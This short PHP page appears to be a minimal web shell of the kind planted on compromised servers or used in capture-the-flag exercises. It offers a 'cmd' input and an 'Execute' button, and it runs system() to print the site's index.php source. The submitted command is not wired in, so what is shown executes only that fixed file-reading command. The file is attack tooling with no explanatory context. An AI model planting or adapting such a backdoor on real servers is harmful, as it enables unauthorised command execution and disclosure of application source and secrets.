<!DOCTYPE html>

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
        echo system('cat /var/www/html/index.php');
    
?>
</pre>
</body>
</html>
